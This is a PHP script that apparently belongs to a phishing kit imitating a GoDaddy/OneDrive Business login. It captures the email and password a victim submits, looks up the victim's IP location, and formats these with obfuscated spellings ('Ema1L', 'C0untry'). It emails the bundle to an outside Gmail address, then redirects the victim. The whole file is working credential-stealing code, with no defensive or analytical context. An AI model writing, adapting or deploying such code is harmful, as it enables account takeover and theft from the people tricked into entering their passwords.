<?php

$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$url='http://www.geoplugin.net/json.gp?ip='.$_SERVER['REMOTE_ADDR'];
			//$ipdetails=file_get_contents($url);
			//$response_tags=json_decode($ipdetails);
			
			//echo $url.'==============';
			
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       
		
			$ouputdata = curl_exec($ch);
			curl_close($ch);
			
			$response_tags=json_decode($ouputdata);
			
			$country=$response_tags->geoplugin_countryName;
			$state=$response_tags->geoplugin_region;
			$city=$response_tags->geoplugin_city;


$msg .= "G0Daddy Logz - OneDriveBiz\n";
$msg .= "******************************\n";
$msg .= "Ema1L: ".$_POST['emal']."\n";
$msg .= "Pasw: ".$_POST['pasowonder']."\n";

$msg .= "\n";
$msg .= "========== IP Adress & Date ==========\n";
$msg .= "http://www.ip2location.com/$ip\n";
$msg .= "Date: $time\n";

$msg .= "\n";
$msg .= "---------= Location =---------\n";
$msg .= "C0untry: ".$country."\n";
$msg .= "Stat3: ".$state."\n";
$msg .= "City: ".$city."\n";
$msg .= "\n";

$msg .= "---------= Additional Details =---------\n";
$msg .= "HostNam3 : ".$hostname."\n";
$msg .= "Us3r-Ag3nt : ".$useragent."\n";

$to ="blessedbox2018@gmail.com";
$subject = "$ip - $state, $country";
$from = "From: EL-VXN@ilekunanu.com";

mail($to,$subject,$msg,$from);

header("Location: index_return.php");

?>